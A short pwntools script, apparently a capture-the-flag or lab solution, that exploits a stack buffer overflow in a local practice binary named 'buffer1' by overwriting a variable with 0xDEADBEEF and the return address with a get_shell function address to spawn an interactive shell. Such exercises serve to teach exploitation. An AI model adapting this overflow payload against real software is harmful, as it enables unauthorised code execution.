from pwn import *

p = process('./buffer1')

get_shell_addr = 0x0804849B
deadbeef_val = 0xDEADBEEF

payload = b""
payload += b"A" * 25                # 25 bytes -> 'a'
payload += p32(deadbeef_val)        # 'a' = 0xDEADBEEF
payload += b"B" * 12                
payload += p32(get_shell_addr)      # Ghi đè return address = địa chỉ get_shell

p.sendline(payload)

# shell tương tác
p.interactive()

